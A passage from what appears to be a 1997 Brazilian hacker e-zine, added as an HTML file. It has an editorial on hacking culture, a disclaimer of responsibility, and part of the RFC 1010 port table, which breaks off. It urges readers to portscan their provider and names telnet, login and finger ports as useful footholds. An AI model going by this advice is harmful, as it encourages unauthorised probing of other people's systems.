@@ -1,0 +1,695 @@
+<html>
+<head>
+   <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+   <meta name="GENERATOR" content="Mozilla/4.01 [en] (Win95; I) [Netscape]">
+   <title>HUB - Hackers Unidos do Brasil</title>
+</head>
+<body text="#000000" bgcolor="#FFFFFF" link="#0000FF" vlink="#800080" alink="#FF0000">
+
+<center><a name="início"></a></center>
+
+<center>
+<h1>
+HUB - Hackers Unidos do Brasil - HUB</h1></center>
+
+<center>N&uacute;mero 0, Dezembro de 1997</center>
+&nbsp;
+<br>&nbsp;
+
+<p>Editor:
+<ul>
+<li>
+<a href="mailto:overall@hackhour.com.br">Overall</a></li>
+</ul>
+
+
+<p>&nbsp;Colaboradores:
+<ul>
+<li>
+<a href="mailto:cyberoptik@base.com.br">Cyber Optik</a>,</li>
+
+<li>
+<a href="mailto:polamsky@away.com">Polamsky</a>,</li>
+
+<li>ARG</li>
+</ul>
+
+
+<p>Temas:
+<ul>
+<li><a href="#ini">Considera&ccedil;&otilde;es Iniciais</a></li>
+<li><a href="#editorial">Editorial - Hacking no Brasil</a></li>
+<li><a href="#Portas">Defini&ccedil;&atilde;o das Portas TCP</a></li>
+<li><a href="#NT">Sniffer pro NT (fonte)</a></li>
+<li><a href="#ra">Hackeando um BBS em Remote Access</a></li>
+<li><a href="#News">Servidores P&uacute;blicos de News Groups</a></li>
+<li><a href="#netbeui">Hackeando o Win95</a></li>
+<li><a href="#ultnot">&Uacute;ltimas Not&iacute;cias</a></li>
+<li><a href="#creditos">Créditos e Agradecimentos</a></li>
+<li><a href="#avisos">Avisos</a></li>
+</ul>
+
+
+<p><a name="ini"><hr></a><p>
+<h1>Considera&ccedil;&otilde;es Iniciais</h1>
+Seguinte: primeiro n&uacute;mero, muitas considera&ccedil;&otilde;es...
+Antes de se tentar escrever algo, mas algo novo, a gente
+<br>nunca sabe a dificuldade e as considera&ccedil;&otilde;es que est&atilde;o
+envolvidas nessa escrita. Linguagem, formato, tamanho,
+<br>estilo, conte&uacute;do... HTML x TXT puro, curto x longo, hard x soft,
+linguagem "dus manu" x portugu&ecirc;s arcaico...
+<br>Nunca se sabe...
+
+<p>Depois de muita conversa e muita (mesmo) cerveja e algumas doses de
+Martini pelo meio do caminho
+<br>chegamos a alguns consensos:
+<ul>
+<li>
+<b>Objetivo</b>: transmitir informa&ccedil;&otilde;es que n&atilde;o s&atilde;o
+facilmente encontradas sem que se leia as entrelinhas. Bugs, exploits,
+falhas em sistemas operacionais, t&eacute;cnicas de hacking e coisas do
+tipo ser&atilde;o constantes em nossas p&aacute;ginas virtuais.</li>
+
+<li>
+<b>Linguagem</b>: n&atilde;o usaremos linguagem chula em nossos textos,
+pois nosso objetivo n&atilde;o &eacute; ofender ningu&eacute;m, mas informar.
+Apesar de que sempre tem uma hora ou outra que uma linguagenzinha de baixo
+cal&atilde;o n&atilde;o faz mal &agrave; ningu&eacute;m... eheheh :-)</li>
+
+<li>
+<b>Formato</b>: ainda n&atilde;o definitivamente decidido. Estamos soltando
+o n&uacute;mero 1 no formato HTML para preservarmos a acentua&ccedil;&atilde;o
+portuguesa, para termos um m&iacute;nimo de formata&ccedil;&atilde;o de
+texto (negrito, it&aacute;lico, etc) e para facilitar a divulga&ccedil;&atilde;o
+pela web. Apesar de estarmos usando o HTML, n&atilde;o usaremos nenhum
+recurso que o primeiro Mosaic n&atilde;o possa abrir.</li>
+
+<li>
+<b>Tamanho</b>: pequeno. A id&eacute;ia &eacute; que tenhamos edi&ccedil;&otilde;es
+frequentes e n&atilde;o muito longas, para facilitar nosso trabalho no
+levantamento dos dados e para nos certificar que a informa&ccedil;&atilde;o
+&eacute; nova.</li>
+
+<li>
+<b>Estilo</b>: livre. Como temos diversos autores, e aceitamos textos enviados
+por terceiros, desde que de autoria pr&oacute;pria ou tradu&ccedil;&otilde;es,
+n&atilde;o temos como ter um estilo uniforme. Cada um faz seu estilo. Somos
+um pa&iacute;s livre! Nada de imposi&ccedil;&otilde;es! eheheh...</li>
+
+<li>
+<b>Conte&uacute;do</b>: livre. Desde o assunto tenha a ver com computadores
+falaremos de tudo um muito e de um muito, tudo. :-)</li>
+</ul>
+Bom... Acho que pra come&ccedil;ar &eacute; isso. S&oacute; queria lembrar
+que nenhum de n&oacute;s tem filhos em idade de ler e que por isso n&atilde;o,
+repito N&Atilde;O nos responsabilizamos por nenhum, repito NENHUM ato cometido
+por qualquer pessoa que ler este zine, n&atilde;o importa se foi ou n&atilde;o
+inspirado no que dissemos, nos arquivos que mencionarmos, nos fontes que
+dermos ou em qualquer material relacionado &agrave; HUB. Se voc&ecirc;
+fizer merda isso &eacute; problema seu. Corre pra tua m&atilde;e. Se vira!
+T&ocirc; fora, bro...
+
+<p><a href="#inicio">Volta ao início</a>&nbsp;
+
+<p><a name="editorial"><hr></a><p>
+
+<h1>Editorial - Hacking no Brasil</h1>
+Brasil, Hacking, Pr&eacute;-Hist&oacute;ria e feudos s&atilde;o termos intimamente ligados. No brasil eu sinto que n&atilde;o existe o meio termo. Ou o cara come chips de sil&iacute;cio no caf&eacute; da manh&atilde; e usa a B&iacute;blia do Linux como travesseiro ou n&atilde;o sabe nem onde fica a tecla "any key"... eheheh...
+
+<p>&Eacute; impressionante a quantidade de lammers por esse paiz&atilde;o v&eacute;io de guerra. Se vc quer encontrar um &eacute; s&oacute; abrir um chat qualquer e logo aparece. Melhor ainda se o chat for sobre hacking. Fico pasmo ao ver a quantidade de gente que aprendeu uma ou duas receitas
+de bolo e j&aacute; se consideram os "Super Hackers do Universo"!!
+
+<p>J&aacute; me perguntaram "Como fa&ccedil;o pra ser hacker?". A resposta &eacute; uma s&oacute;: leia. Leia tudo, leia muito, leia os manuais do que vc compra, seja hardware ou software, leia revistas especializadas, aprenda a programar em tudo o que vc puder.<p>
+
+Quanto mais vc souber sobre linguagens, mais f&aacute;cil vai ser vc fazer seu pr&oacute;prio hacking, sem
+ter que usar as receitinhas de bolo de outros. Aqui na HUB n&oacute;s vamos tamb&eacute;m fornecer algumas receitas de vez em quando, mas incentivamos sempre que vc leia o que est&aacute; por tr&aacute;s das receitas.
+
+<p>Se vc tem pretens&atilde;o de ser um bom hacker, seja antes um bom leitor. Essa &eacute; a regra b&aacute;sica.
+
+<p>Outra regra &eacute; ser curioso. Nunca se contentar em ver algo funcionando pura e simplesmente, mas ser curioso em saber porque e como aquilo funcionou. Abrir um arquivo fonte e entender o que o cara fez e porque ele fez aquilo.
+
+<p>Por &uacute;ltimo, e somente se vc estiver com pregui&ccedil;a, use as ferramentas que os outros criaram. Eles as criaram pra facilitar a vida deles pr&oacute;prios, ent&atilde;o, porque n&atilde;o usarmos tamb&eacute;m, n&atilde;o &eacute; mesmo... ehehehe :-)
+<p>
+<p>Nice Hacking!
+<br><a href="mailto:overall@hackhour.com.br">Overall</a>
+
+<p><a href="#inicio">Volta ao in&iacute;cio</a>
+
+<p><a name="Portas"><hr></a><p>
+
+<h1>Defini&ccedil;&atilde;o das Portas TCP</h1>
+N&atilde;o traduzimos este texto, mas pra parte que importa n&atilde;o
+&eacute; necess&aacute;ria uma tradu&ccedil;&atilde;o... :-)
+<br>Apenas grifamos as portas que consideramos mais &uacute;teis ou importantes.
+
+<p>Ah! Antes que eu me esque&ccedil;a: esse texto foi tirado da RFC 1010 facilmente encontrada na Internet,<br>
+mas como a maior parte dos "raquers" brasileiros tem pregui&ccedil;a de ler textos em ingl&ecirc;s ou n&atilde;o<br>
+conseguiriam mesmo que quisessem, resolvemos colocar isso aqui pra
+ja ir aquecendo suas turbinas.
+
+<p>Existe na Internet uma s&eacute;rie de programas que localizam as portas
+"abertas" no servidor determinado <br>pelo usu&aacute;rio. Voc&ecirc; localiza v&aacute;rios deles (chamados
+portscan, ou port scanners) em qualquer um dos
+<br>mirrors do Tucows ou em centenas de outros lugares. Um dos port scanners
+que eu mais gosto &eacute; o
+<br>"Portscan" da "7th Sphere", tamb&eacute;m facilmente encontr&aacute;vel
+na Net. Outra boa ferramenta &eacute; o HU,
+<br>ou Hacker Utilities; um aplicativo que cont&eacute;m uma s&eacute;rie
+de ferramentas b&aacute;sicas que, sabendo usar,
+<br>podem ser muito &uacute;teis.
+
+<p>O que fazer com as portas que voc&ecirc; encontrar? eheheh...&nbsp;
+Isso depende do que voc&ecirc; *sabe* fazer...
+<br>:-)
+
+<p>Nos pr&oacute;ximos n&uacute;meros da Hub estaremos mostrando como explorar
+algumas das portas mais
+<br>comuns. Fique atento.
+
+<p>Por enquanto teste o portscanner de sua prefer&ecirc;ncia no seu pr&oacute;prio
+provedor pra ver se ele tem
+<br>alguma porta aberta. Normalmente os provedores deixam abertas as portas
+21 (FTP), 25 (SMTP),
+<br>e 80 (HTTP). Em alguns provedors novos ou menos competentes vc tamb&eacute;m
+encontra algumas
+<br>portas que te permitem logar no sistema, desde que vc tenha a senha,
+mas se essa(s) porta estiver
+<br>aberta j&aacute; &eacute; meio caminho andado.
+
+<p>Fique atento tamb&eacute;m &agrave;s portas 23 (Telnet), 49 (Login),
+e 79 (finger) que tamb&eacute;m podem ser &uacute;teis.
+<br>&nbsp;
+<br>&nbsp;
+<pre>RFC 1010 - Assigned Numbers&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; May 1987
+Port Numbers
+
+
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>PORT NUMBERS
+
+</b>&nbsp;&nbsp; Ports are used in the TCP [36,81] to name the ends of logical
+&nbsp;&nbsp; connections which carry long term conversations.&nbsp; For the purpose of
+&nbsp;&nbsp; providing services to unknown callers, a service contact port is
+&nbsp;&nbsp; defined.&nbsp; This list specifies the port used by the server process as
+&nbsp;&nbsp; its contact port.&nbsp; The contact port is sometimes called the
+&nbsp;&nbsp; "well-known port".
+
+&nbsp;&nbsp; To the extent possible, these same port assignments are used with the
+&nbsp;&nbsp; UDP [37,79].
+
+&nbsp;&nbsp; To the extent possible, these same port assignments are used with the
+&nbsp;&nbsp; ISO-TP4 [52].
+
+&nbsp;&nbsp; The assigned ports use a small portion of the possible port numbers.
+&nbsp;&nbsp; The assigned ports have all except the low order eight bits cleared
+&nbsp;&nbsp; to zero.&nbsp; The low order eight bits are specified here.
+
+&nbsp;&nbsp; Port Assignments:
+
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Decimal&nbsp;&nbsp; Keyword&nbsp;&nbsp; Description&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; References
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; -------&nbsp;&nbsp; -------&nbsp;&nbsp; -----------&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ----------
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Reserved&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [JBP]
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 1-4&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Unassigned&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [JBP]
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 5&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; RJE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Remote Job Entry&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [9,JBP]
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 7&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ECHO&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Echo&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [70,JBP]
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 9&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; DISCARD&nbsp;&nbsp;&nbsp; Discard&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [69,JBP]
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 11&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; USERS&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Active Users&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [65,JBP]
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 13&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; DAYTIME&nbsp;&nbsp;&nbsp; Daytime&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [68,JBP]
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 15&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Unassigned&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [JBP]
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 17&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; QUOTE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Quote of the Day&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [75,JBP]
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 19&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; CHARGEN&nbsp;&nbsp;&nbsp; Character Generator&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [67,JBP]
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; FTP-DATA&nbsp;&nbsp; File Transfer [Default Data]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [71,JBP]
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>21&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; FTP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; File Transfer [Control]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [71,JBP]
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 23&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; TELNET&nbsp;&nbsp;&nbsp;&nbsp; Telnet&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [87,JBP]
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 25&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; SMTP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Simple Mail Transfer&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [77,JBP]
+</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 27&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; NSW-FE&nbsp;&nbsp;&nbsp;&nbsp; NSW User System FE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [17,RHT]
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 29&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; MSG-ICP&nbsp;&nbsp;&nbsp; MSG ICP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [63,RHT]
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 31&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; MSG-AUTH&nbsp;&nbsp; MSG Authentication&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [63,RHT]
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 33&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; DSP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Display Support Protocol&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [MLC]
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 35&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; any private printer server&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [JBP]
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 37&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; TIME&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Time&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [83,JBP]
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 39&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; RLP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Resource Location Protocol&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [MA]
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 41&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; GRAPHICS&nbsp;&nbsp; Graphics&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [98,JBP]
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>42&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; NAMESERVER Host Name Server&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [74,JBP]
+</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 43&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; NICNAME&nbsp;&nbsp;&nbsp; Who Is&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [46,JAKE]
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 44&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; MPM-FLAGS&nbsp; MPM FLAGS Protocol&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [JBP]
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 45&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; MPM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Message Processing Module [recv]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [73,JBP]
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 46&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; MPM-SND&nbsp;&nbsp;&nbsp; MPM [default send]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [73,JBP]
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 47&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; NI-FTP&nbsp;&nbsp;&nbsp;&nbsp; NI FTP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [103,SK8]
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>49&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; LOGIN&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Login Host Protocol&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [PHD1]
+</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 51&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; LA-MAINT&nbsp;&nbsp; IMP Logical Address Maintenance&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [58,AGM]
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>53&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; DOMAIN&nbsp;&nbsp;&nbsp;&nbsp; Domain Name Server&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [61,70,PM1]
+</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 55&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ISI-GL&nbsp;&nbsp;&nbsp;&nbsp; ISI Graphics Language&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [6,RB9]
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 57&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; any private terminal access&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [JBP]
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 59&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; any private file service&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [JBP]
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 61&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; NI-MAIL&nbsp;&nbsp;&nbsp; NI MAIL&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [4,SK8]
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 63&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; VIA-FTP&nbsp;&nbsp;&nbsp; VIA Systems - FTP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [DXD]
